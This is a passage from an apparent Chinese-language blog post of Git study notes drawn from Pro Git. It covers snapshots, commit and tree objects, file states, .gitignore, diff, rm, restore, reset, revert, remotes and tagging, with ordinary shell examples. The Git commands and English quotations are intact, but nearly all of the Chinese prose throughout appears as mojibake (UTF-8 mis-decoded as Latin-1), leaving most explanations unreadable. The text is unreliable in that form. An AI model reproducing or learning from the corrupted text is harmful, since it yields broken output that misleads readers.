å…¶ä¸­çš„å…·ä½“æ¦‚å¿µã€‚æœ¬ç¯‡åšæ–‡ä¼šè¡¥å……åœ¨ä¸€å‘¨ç›®åšæ–‡ä¸­æ²¡æœ‰è®°å½•çš„ commandï¼ŒåŒæ—¶é€šè¿‡å…·ä½“å®æ“ä¾‹å­æ¥é˜è¿° git çš„æ¦‚å¿µä¸æ“ä½œã€‚</p><blockquote><p>â€¦ , because if you understand what Git is and the fundamentals of how it works, then using Git effectively will probably be much easier for you. â€”â€” <em>Pro Git</em></p></blockquote><h1 id="ä»€ä¹ˆæ˜¯-git"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯-git"></a> ä»€ä¹ˆæ˜¯ Git</h1><h2 id="ä½¿ç”¨-snapshot-è€Œé-Î´"><a class="markdownIt-Anchor" href="#ä½¿ç”¨-snapshot-è€Œé-Î´"></a> ä½¿ç”¨ snapshot è€Œé Î”</h2><p>git å’Œå…¶ä»– VCS (Version Control System)æœ€å¤§çš„åŒºåˆ«å°±åœ¨äºå®ƒä»¬æ˜¯å¦‚ä½•å¯¹å¾… (think of)æ•°æ®çš„ã€‚</p><p>ç»å¤§éƒ¨åˆ†çš„ VCS å­˜å‚¨çš„æ–‡ä»¶ä»¥åŠä¸åŒç‰ˆæœ¬é—´å¯¹è¿™äº›æ–‡ä»¶è¿›è¡Œçš„ä¿®æ”¹ (<strong><em>delta-based</em></strong> version control)ã€‚Store data as a series of <strong>changesets</strong>ã€‚<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/changes.png" alt="changes.png"><br>ç›¸è¾ƒä¹‹ä¸‹ï¼Œgit è®¤ä¸ºæ•°æ®æ˜¯ä¸€ä¸ªå¾®å‹æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ç³»åˆ—å¿«ç…§ (snapshot)ã€‚Store data as a series of <strong>snapshots</strong>.</p><blockquote><p>Git thinks about its data more like a <strong>stream of snapshots</strong>.<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/snapshot.png" alt="snapshot.png"></p></blockquote><h2 id="commit-ä¸-snapshot"><a class="markdownIt-Anchor" href="#commit-ä¸-snapshot"></a> commit ä¸ snapshot</h2><blockquote><p><strong>When you make a commit, Git stores a commit object that contains a pointer to the snapshot of the content you staged.</strong> This object also contains the authorâ€™s name and email address, the message that you typed, and pointers to the commit or commits that directly came before this commit (its parent or parents): zero parents for the initial commit, one parent for a normal commit, and multiple parents for a commit that results from a merge of two or more branches.</p></blockquote><p>snapshot æ˜¯ä¸€ç§å½“å‰é¡¹ç›®çŠ¶æ€çš„ä¸€ç§æŠ½è±¡ï¼Œå®é™…ä¸Šæˆ‘ä»¬çš„ fies ä»¥æ ‘çš„å½¢å¼ (tree object)å­˜å‚¨åœ¨ repo ä¸­ã€‚æˆ‘ä»¬æäº¤åˆ° repo ä¸­çš„ commit åŒ…å«ä¸€äº›å…ƒæ•°æ® ([[#^ce9b5c|meta data]])ä»¥åŠä¸€ä¸ªæŒ‡å‘æ ‘çš„æ ¹èŠ‚ç‚¹çš„æŒ‡é’ˆã€‚</p><blockquote><p>Staging the files computes a checksum for each one, stores that version of the file in the Git repository (Git refers to them as <em>blobs</em>), and adds that checksum to the staging area.</p><p>When you create the commit by running git commit, Git checksums each subdirectory and stores them as a <strong>tree object</strong> in the Git repository. Git then creates a commit object that has the metadata and a pointer to the root project tree so it can re-create that snapshot when needed.</p></blockquote><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/commit_tree.png" alt="commit_tree.png"></p><h2 id="git-çš„æ•°æ®å®Œæ•´æ€§"><a class="markdownIt-Anchor" href="#git-çš„æ•°æ®å®Œæ•´æ€§"></a> Git çš„æ•°æ®å®Œæ•´æ€§</h2><p>æ‰€æœ‰è®°å½•åœ¨ git ä¸­çš„æ•°æ®éƒ½ä¼šä½¿ç”¨å“ˆå¸Œç®—æ³• (SHA-1)è¿›è¡Œæ£€éªŒå’Œå¤„ç†ï¼Œç„¶åæ‰æ ¹æ®å“ˆå¸Œå€¼å°†æ•°æ®è®°å½•åœ¨ git ä¸­ï¼Œè¿™ä¹Ÿæ„å‘³ç€ä¸å¯èƒ½åœ¨ä¸è¢« git è®°å½•çš„æƒ…å†µä¸‹ä¿®æ”¹å…¶ä¸­çš„æ–‡ä»¶ã€‚â€“&gt; integrity</p><blockquote><p>You canâ€™t lose information in transit or get file corruption without Git being able to detect it.</p></blockquote><h2 id="ä¸‰ç§-git-è¿½è¸ªçš„æ–‡ä»¶çŠ¶æ€é‡è¦"><a class="markdownIt-Anchor" href="#ä¸‰ç§-git-è¿½è¸ªçš„æ–‡ä»¶çŠ¶æ€é‡è¦"></a> ä¸‰ç§ git è¿½è¸ªçš„æ–‡ä»¶çŠ¶æ€ï¼ˆé‡è¦ï¼‰</h2><p>git è¿½è¸ª (tracking)çš„æ–‡ä»¶æœ‰ä¸‰ç§çŠ¶æ€ï¼š<em>modified, staged and committed</em></p><ul><li><em>modified</em> æ„å‘³ç€å¯¹æ–‡ä»¶åšäº†ä¿®æ”¹ä½†æ˜¯è¿˜æ²¡æœ‰ commit åˆ°æ•°æ®åº“ (local or remote)ä¸­</li><li><em>staged</em> æ„å‘³ç€æ ‡è®°å·²ä¿®æ”¹çš„æ–‡ä»¶å¹¶ä¸”å¯ä»¥ commit å…¶å½“å‰ç‰ˆæœ¬</li><li><em>committed</em> æŒ‡æ–‡ä»¶å·²ç»å®‰å…¨åœ°å­˜å‚¨åœ¨äº†æœ¬åœ°æ•°æ®åº“ä¸­<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/status.png" alt="status.png"><br>ä¸‰ç§çŠ¶æ€ä¹Ÿå¯¹åº”ç€ä¸‰ä¸ªæ¦‚å¿µï¼š<em>working tree, staging area and Git repository</em></li><li><u>The working tree is a single checkout of one version of the project. </u>These files are pulled out of the <strong>compressed</strong> database in the Git directory and placed on disk for you to use or modify.</li><li><u>The staging area is a file, generally contained in your Git directory</u>, that stores information about what will go into your next commit.</li><li><u>The Git directory is where Git stores the <b>metadata</b> and object database</u> for your project. This is the most important part of Git, and <strong>it is what is copied when you clone a repository from another computer.</strong> (ps: æ–‡ä¸­æ‰€è¯´çš„&quot;metadata&quot;å¯ä»¥ç†è§£ä¸ºå¯¹æ•°æ®çš„å­˜æ”¾ã€è®¿é—®ã€å¤„ç†ç­‰æ“ä½œçš„è§„åˆ™ï¼Œå¯ä»¥è”æƒ³ HTML çš„&lt;head&gt;ä¸­çš„&lt;meta&gt; tagï¼Œä»¥åŠç±»æ¯”äºç£ç›˜ç®¡ç†ä¸­çš„ MBR) ^ce9b5c</li></ul><p>åŸºäºè¿™ä¸‰ç§çŠ¶æ€ï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡Œä¸€æ¡æ ‡å‡†ï¼ˆå¸¸è§ï¼‰çš„å·¥ä½œæµï¼š</p><ol><li>åœ¨å½“å‰çš„å·¥ä½œç›®å½•ä¸‹ä¿®æ”¹æ–‡ä»¶</li><li>é€šè¿‡<code>add</code>æ¥é€‰æ‹©æ€§åœ°å°†æ–‡ä»¶åŠ å…¥åˆ°æš‚å­˜åŒºä¸­ï¼Œå‡†å¤‡æäº¤</li><li>å°†æš‚å­˜åŒºçš„æ–‡ä»¶æäº¤åˆ°æœ¬åœ°ä»“åº“ï¼Œå¹¶ä¸”æ°¸ä¹…åœ°è®°å½•ä¸‹å®ƒçš„å¿«ç…§ï¼ˆè®°ä½æˆ‘ä»¬æ˜¯é€šè¿‡ hash value æ¥å¯¹ snapshot è¿›è¡Œå”¯ä¸€æ ‡è¯†çš„ï¼‰</li></ol><h1 id="git-åŸºç¡€"><a class="markdownIt-Anchor" href="#git-åŸºç¡€"></a> Git åŸºç¡€</h1><h2 id="tracked-staged-and-untracked"><a class="markdownIt-Anchor" href="#tracked-staged-and-untracked"></a> Tracked, Staged and Untracked</h2><p>å‰é¢è¯´â€œgit è¿½è¸ªçš„æ–‡ä»¶æœ‰ä¸‰ç§çŠ¶æ€â€ï¼Œå…¶ä¸­è¿½è¸ªå°±æ˜¯æŒ‡ trackedï¼Œé¡¾åæ€ä¹‰ git èƒ½å¤ŸçŸ¥é“æ–‡ä»¶æ˜¯å¦åšäº†æ›´æ”¹ (changes)ã€‚<u>å®é™…ä¸Šï¼Œgit ç›®å½•ä¸‹çš„æ–‡ä»¶åªæœ‰ä¸¤ç§çŠ¶æ€ï¼Œtracked or untracked</u>ã€‚å¯¹äº untracked files æ¥è¯´ï¼Œæˆ‘ä»¬é€šè¿‡<code>git add</code>æ¥å°†å®ƒä»¬æ¨åˆ°æš‚å­˜åŒºä¸­ï¼Œæ­¤æ—¶çš„ snapshot åŠ å…¥äº†æ­¤æ¬¡å˜åŠ¨ï¼Œæ‰€ä»¥å®ƒä»¬<strong>æš‚æ—¶</strong>ä¹Ÿæ˜¯ staged çŠ¶æ€ï¼ˆå½“ç„¶ä¹Ÿæ˜¯ trackedï¼‰ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬å¯¹å®ƒä»¬è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆè¿™äº› tracked æ–‡ä»¶çš„ä¿®æ”¹ä¼šè¢« git è¿½è¸ªï¼Œä½†å¹¶æ²¡æœ‰å°† changes æ›´æ–°åˆ° staging area çš„ snapshot ä¸­ï¼Œæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬ commit çš„è¯å°†æ˜¯æŠŠæœªæ›´æ–°çš„ snapshot æ°¸ä¹…è®°å½•åœ¨ git log ä¸­ã€‚ä¸ºäº†æ›´æ–° snapshot ä¸­çš„æ–‡ä»¶ç‰ˆæœ¬ï¼Œæˆ‘ä»¬åœ¨ä¿®æ”¹åè¿˜éœ€è¦<code>git add</code>é‡æ–° stagingã€‚</p><blockquote><p>Untracked basically means that Git sees a file you didnâ€™t have in the previous snapshot (commit), and which hasnâ€™t yet been staged.</p><p><code>git add</code> is a multipurpose command â€” you use it to begin <strong>tracking new files</strong>, to <strong>stage files</strong>, and to do other things like marking merge-conflicted files as resolved. It may be helpful to think of it more as â€œ<u>add precisely this content to the next commit</u>â€ rather than â€œadd this file to the projectâ€.</p></blockquote><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/git_status.png" alt="git_status.png"></p><h2 id="ignoring-files"><a class="markdownIt-Anchor" href="#ignoring-files"></a> Ignoring Files</h2><p>æœ‰æ—¶å€™æˆ‘ä»¬çš„å·¥ä½œç›®å½•ä¸­ä¼šæœ‰ä¸€äº›æˆ‘ä»¬ä¸æƒ³æäº¤çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ç¼–è¯‘ä¸­é—´è¿‡ç¨‹äº§ç”Ÿçš„<code>.o</code>æ–‡ä»¶ã€æ—¥å¿—ç­‰ï¼Œè€Œå®ƒä»¬åˆæ€»æ˜¯ä¼šå‡ºç°åœ¨<code>Untracked files</code>ä¸‹ï¼Œä¸ºäº†è®© git å¿½ç•¥å®ƒä»¬ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª<code>.gitignore</code>éšè—æ–‡ä»¶ã€‚<code>.gitignore</code>ä¸­å†™çš„æ˜¯ä½ éœ€è¦å¿½ç•¥çš„æ–‡ä»¶åï¼Œå½“ç„¶å¯ä»¥ä½¿ç”¨é€šé…ç¬¦ (glob pattern)çš„å½¢å¼ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> .gitignore</span></span><br><span class="line">*.[oa]</span><br><span class="line">*~</span><br><span class="line">a.txt</span><br><span class="line">build/</span><br><span class="line">!hello.o</span><br></pre></td></tr></table></figure><h2 id="git-diff"><a class="markdownIt-Anchor" href="#git-diff"></a> git diff</h2><blockquote><p>youâ€™ll probably use it most often to answer these two questions: <strong>What have you changed but not yet staged? And what have you staged that you are about to commit?</strong></p></blockquote><p>ä¸åŒäº<code>git status</code>åªç»™å‡ºå“ªäº›æ–‡ä»¶åšäº†ä¿®æ”¹ï¼Œ<code>git diff</code>èƒ½æ›´è¯¦ç»†åœ°ç»™å‡ºæ–‡ä»¶ä¸­å¢åŠ æˆ–åˆ é™¤çš„æ–‡æœ¬è¡Œï¼Œè¿™äº›æ˜¯åšäº†ä¿®æ”¹ä½†æ˜¯å«æ²¡æœ‰æš‚å­˜çš„æ–‡ä»¶ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œ<code>git diff</code>æ¯”è¾ƒçš„æ˜¯<u>å·¥ä½œç›®å½•ä¸‹çš„æ–‡ä»¶å’Œæš‚å­˜åŒºä¸­çš„æ–‡ä»¶</u>ï¼Œæ‰€ä»¥è®°å¾—è¦åœ¨ä¿®æ”¹åè¦æ›´æ–° snapshotï¼Œæ‰ä¼šæ›´æ–°æ–‡ä»¶çš„ versionã€‚<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/diff.png" alt="diff.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git diff --staged</span></span><br></pre></td></tr></table></figure><p>åŠ ä¸Š option<code>--staged</code>åˆ™ä¼šæ¯”è¾ƒæš‚å­˜åŒºæ–‡ä»¶å’Œä¸Šä¸€æ¬¡ commit çš„åŒºåˆ«ï¼Œæ³¨æ„çœ‹<code>hello.cc</code>æ–‡ä»¶çš„ç‰ˆæœ¬æ˜¯è¿˜æ²¡æœ‰æ›´æ–°çš„ï¼Œè¿˜æ˜¯æš‚å­˜åŒºä¸­çš„æ—§ç‰ˆæœ¬ã€‚<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/diff_staged.png" alt="diff_staged.png"><br>è¦æ³¨æ„ï¼Œ<code>git diff</code>è¿™ä¸ªå‘½ä»¤æœ¬èº«åªæ¯”è¾ƒä¿®æ”¹åçš„ unstaged æ–‡ä»¶å’Œ staged æ–‡ä»¶é—´çš„åŒºåˆ«ï¼Œè€Œä¸ä¼šæ˜¾ç¤ºå®ƒä»¬ä¸ä¸Šä¸€æ¬¡ commit çš„åŒºåˆ«ï¼</p><h2 id="git-rm"><a class="markdownIt-Anchor" href="#git-rm"></a> git rm</h2><p><code>git rm</code>å°†æ–‡ä»¶ä» working directory ä¸­åˆ é™¤ï¼ŒåŒæ—¶ stage changesã€‚åœ¨ä¸‹å›¾çš„æƒ…å†µä¸­ï¼Œå¦‚æœæˆ‘ä»¬æ­¤æ—¶ commitï¼Œé‚£ä¹ˆ history ä¸­çš„ snapshot å°†ä¸å†æœ‰<code>hello</code>æ–‡ä»¶ï¼Œä½†æ˜¯<code>b.txt</code>è¿˜æ˜¯å­˜åœ¨çš„ï¼Œå› ä¸º git å¹¶æ²¡æœ‰è®°å½•è¯¥æ–‡ä»¶çš„æ”¹å˜ (deletion)ã€‚</p><blockquote><p>You can pass files, directories, and file-glob patterns to the <code>git rm</code> command.</p></blockquote><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/git_rm.png" alt="git_rm.png"><br>æ—¢ç„¶<code>git add</code>å¯ä»¥ä½¿æ–‡ä»¶ untracked --&gt; trackedï¼Œå½“æˆ‘ä»¬ä¸å°å¿ƒ add äº†ä¸å¸Œæœ›æäº¤çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†å…¶ä» tracked çŠ¶æ€è½¬å˜ä¸º untracked çŠ¶æ€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">rm</span> --cached filename</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/rm_cached.png" alt="rm_cached.png"></p><h2 id="undoing-things"><a class="markdownIt-Anchor" href="#undoing-things"></a> Undoing Things</h2><h3 id="1-ä¿®è®¢ä¸Šæ¬¡çš„æäº¤"><a class="markdownIt-Anchor" href="#1-ä¿®è®¢ä¸Šæ¬¡çš„æäº¤"></a> 1. ä¿®è®¢ä¸Šæ¬¡çš„æäº¤</h3><p>å¦‚æœæˆ‘ä»¬åœ¨ commit åå‘ç°æœ‰äº›æ›´æ”¹å¿˜è®° stage äº†ï¼Œå¯ä»¥åŠ ä¸Š option<code>--amend</code>æ¥ä¿®æ­£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -m <span class="string">&quot;my first commit&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add CNAME.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit --amend</span></span><br></pre></td></tr></table></figure><h3 id="2-å°†-staged-è½¬ä¸º-unstaged"><a class="markdownIt-Anchor" href="#2-å°†-staged-è½¬ä¸º-unstaged"></a> 2. å°† staged è½¬ä¸º unstaged</h3><p>æˆ‘ä»¬å¯èƒ½é€šè¿‡<code>git add *</code>ä¸å°å¿ƒæš‚å­˜äº†æˆ‘ä»¬ä¸æƒ³åœ¨ä¸‹æ¬¡ commit çš„æ–‡ä»¶ï¼Œä¸ºäº†å°†å…¶ä»æš‚å­˜åŒºä¸­è§£æ•‘å‡ºæ¥ï¼Œéœ€è¦ä¸‹é¢çš„å‘½ä»¤ï¼ˆå…¶å®è¿™åœ¨ header ä¸­æœ‰å†™ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">showed <span class="keyword">in</span> status bar, better    âˆš</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git restore --staged filename</span></span><br><span class="line">or</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">old version: wrote <span class="keyword">in</span> _Pro git_ Ã—</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git reset HEAD filename</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„å®ƒå’Œä¸Šæ–‡æåˆ°çš„è§£é™¤è¿½è¸ªçŠ¶æ€ tracked --&gt; untracked ä¹‹é—´çš„åŒºåˆ«ï¼</p><h3 id="3-æ’¤é”€å¯¹æ–‡ä»¶çš„ä¿®æ”¹"><a class="markdownIt-Anchor" href="#3-æ’¤é”€å¯¹æ–‡ä»¶çš„ä¿®æ”¹"></a> 3. æ’¤é”€å¯¹æ–‡ä»¶çš„ä¿®æ”¹</h3><p>å¦‚æœè¦å¯¹åšäº†ä¿®æ”¹çš„æ–‡ä»¶è¿›è¡Œå›é€€ (unmodify)ï¼Œå¯ä»¥<code>git restore</code>ï¼Œå½“ç„¶è¿™ä¹Ÿæ˜¯åœ¨ header ä¸­æœ‰æç¤ºçš„ã€‚<br>ä¸è¿‡è¿™ä¸ªå‘½ä»¤è¿˜æ˜¯è¦æ…é‡ä½¿ç”¨</p><blockquote><p>Itâ€™s important to understand that <code>git restore filename</code> is a dangerous command. Any local changes you made to that file are gone â€” <strong>Git just replaced that file with the last staged or committed version</strong>.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git restore filename</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/discard.png" alt="discard.png"><br>å¦‚æœæƒ³è¦ä¿å­˜ä¿®æ”¹ï¼ŒåŒæ—¶åˆæƒ³è®©å…¶ä¸æ˜¾ç¤ºåœ¨ status ä¸­ï¼Œåœ¨ <em>Pro Git, go over stashing and branching</em> ä¸€èŠ‚ä¸­æœ‰è®²ï¼Œç”±äºä¸æ˜¯å¾ˆé‡è¦ï¼Œæ•…ä¸åœ¨æ­¤èµ˜è¿°ã€‚</p><blockquote><p>Remember, anything that is <u>committed in Git</u> can almost always be recovered. Even commits that were on branches that were deleted or commits that were overwritten with an <code>--amend</code>commit can be recovered. <strong>However, anything you lose that was never committed is likely never to be seen again.</strong></p></blockquote><h3 id="4å›é€€å†å²"><a class="markdownIt-Anchor" href="#4å›é€€å†å²"></a> 4.å›é€€å†å²</h3><p>è®¨è®ºäº†è¿™ä¹ˆå¤šï¼Œæˆ‘ä»¬ç»ˆäºè¿æ¥äº†ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„ä¸€ä¸ªé‡è¦çš„ç‰¹æ€§ï¼šå›é€€ (rewind/roll back/revoke)ã€‚åœ¨ git ä¸­å¸¸ç”¨çš„æœ‰ä¸¤ç§æ–¹å¼å°†æˆ‘ä»¬çš„ working tree å›é€€åˆ°ä¹‹å‰çš„ snapshot ä¸­ï¼Œåˆ†åˆ«æ˜¯<code>reset</code>å’Œ<code>revert</code>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">the commmit<span class="string">&#x27;s checksum you want to roll back</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="string">git reset &lt;commit ID&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/git_reset.png" alt="git_reset.png"><br><code>reset</code>å®é™…é€šè¿‡ä¸‰æ­¥æ¥å®Œæˆå›é€€ï¼ˆå…·ä½“å¯çœ‹ <em>Sec 7.7 Git Tools - Reset Demystified</em>ï¼‰ï¼Œç»“æœæ˜¯å®ƒå°†å®Œå…¨èˆå¼ƒ (discard)å›é€€ç›®æ ‡ç‚¹åçš„æ‰€æœ‰ commitsï¼ŒåŒæ—¶æ ¹æ® snapshot æ¢å¤å·¥ä½œç›®å½•å’Œ<code>HEAD</code>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ID is</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git revert &lt;commit ID&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/git_revert.png" alt="git_revert.png"><br>åŒæ ·æ˜¯å›é€€ï¼Œä½†æ˜¯<code>revert</code>æ˜¯é‡ç½®æŸä¸ªç‰¹å®šæäº¤ä¹‹å‰å¯¹æ–‡ä»¶æ‰€åšçš„æ‰€æœ‰ä¿®æ”¹ï¼Œå¹¶ä¸”ä»¥ä¸€ä¸ªæ–°çš„ commit æäº¤åˆ°å†å²ä¸­ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>revert</code>æ˜¯æ¢å¤æŒ‡å®š commit ä¹‹å‰çš„çŠ¶æ€ï¼Œè€Œ<code>reset</code>æ˜¯æ¢å¤ä¸ºæŒ‡å®š commit çš„çŠ¶æ€ï¼Œç•¥æœ‰ä¸åŒã€‚</p><p>ä¸ºäº†å®‰å…¨èµ·è§ï¼Œåœ¨æ’¤é”€æœ‰å…¶ä»–å¼€å‘è€…å·¥ä½œçš„ repo ä¸­çš„ä¿®æ”¹æ—¶ï¼Œè¯·ä½¿ç”¨ Â <code>git revert</code>ã€‚</p><h2 id="working-with-remotes"><a class="markdownIt-Anchor" href="#working-with-remotes"></a> Working with Remotes</h2><p>é™¤äº†åœ¨æœ¬åœ°çš„ repo ä¸Šå·¥ä½œå¤–ï¼Œæˆ‘ä»¬è¿˜å¯èƒ½éœ€è¦ç”¨åˆ°è¿œç«¯ä»“åº“æ¥å’Œå…¶ä»–äººåä½œï¼Œæˆ–è€…å•çº¯ä½œä¸ºæœ¬åœ°åº“çš„ä¸€ä¸ªå¤‡ä»½ã€‚ä¸€ä¸ªæœ¬åœ°ä»“åº“å¯ä»¥è”ç³»ä¸åŒçš„è¿œç«¯ä»“åº“ï¼Œæ¯”å¦‚å¯ä»¥é€‰æ‹© Github æ‰˜ç®¡ä¸€ä¸ª repoï¼Œ<s>ç”¨ Gitee æ‰˜ç®¡å¦ä¸€ä¸ª</s>ã€‚</p><blockquote><p>Remote repositories are versions of your project that are hosted on the Internet or network somewhere. You can have several of them, each of which generally is either read-only or read/write for you.</p><p>The word â€œ<strong>remote</strong>â€ does not necessarily imply that the repository is somewhere else on the network or Internet, only that it is elsewhere.</p></blockquote><h3 id="1-å…³äº-git-clone"><a class="markdownIt-Anchor" href="#1-å…³äº-git-clone"></a> 1. å…³äº git clone</h3><p>æˆ‘ä»¬ clone çš„ä»“åº“æ˜¯ä¼šè‡ªå·±é»˜è®¤è”ç³»åŸæœ¬çš„è¿œç«¯ä»“åº“çš„ï¼Œæ‰€ä»¥è¯´æˆ‘ä»¬åœ¨åˆšå…‹éš†çš„ä»“åº“ä¸‹<code>git remote -v</code>æŸ¥çœ‹è¿œç«¯ä»“åº“ä¿¡æ¯æ—¶ä¼šå‘ç°å·²æœ‰<code>origin</code> (æˆ–å…¶ä»– shortname)ã€‚æˆ‘è§‰å¾—è¿™æ˜¯å› ä¸º commit åˆ°è¿œç«¯ä»“åº“çš„æ•°æ®æ˜¯æœ¬åœ°ä»“åº“çš„â€œå…¨éƒ¨â€ï¼Œæ‰€ä»¥ä¹Ÿä¼šå¸¦ä¸Š clone çš„ä»“åº“çš„ä¿¡æ¯ã€‚</p><blockquote><p>â€¦ the <code>git clone</code> command <strong>implicitly</strong> adds the origin remote for you.</p></blockquote><h3 id="2-adding-renaming-and-removing"><a class="markdownIt-Anchor" href="#2-adding-renaming-and-removing"></a> 2. Adding, Renaming and Removing</h3><p>æ“ä½œå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">add a remote</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote add &lt;shortname&gt; &lt;URL&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">change a remote<span class="string">&#x27;s shortnam</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="string">git remote rename &lt;fromName&gt; &lt;toName&gt;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">remove a remote</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="string">git remote remove &lt;shortname&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>å…³äº renameï¼šItâ€™s worth mentioning that this changes all your remote-tracking branch names, too.<br>å…³äº removeï¼šOnce you delete the reference to a remote this way, all remote-tracking branches and configuration settings associated with that remote are also deleted.</p></blockquote><h2 id="tagging"><a class="markdownIt-Anchor" href="#tagging"></a> Tagging</h2><p>git èƒ½è®©æˆ‘ä»¬ä¸ºæŸäº›æäº¤æ‰“ä¸Š tagï¼Œä»¥æ­¤è¡¨æ˜è¿™äº›æäº¤å¾ˆé‡è¦ï¼Œä¾‹å¦‚æ ‡è®°æ–°ç‰ˆæœ¬çš„å‘å¸ƒ (v1.0, v2.0)ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">lightweighting tag</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git tag &lt;tagName&gt; (&lt;checksum&gt;)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">annotated tag</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git tag -a &lt;tagName&gt; -m <span class="string">&quot;message&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">delete tag, but not remove from remote</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git tag -d &lt;tagName&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">variation: remove from remote</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push origin --delete &lt;tagName&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬è¦ä¸ºä¹‹å‰çš„ commit æ‰“ä¸Šæ ‡ç­¾ï¼Œéœ€è¦æŒ‡å‡ºéœ€è¦ tag çš„æäº¤çš„ 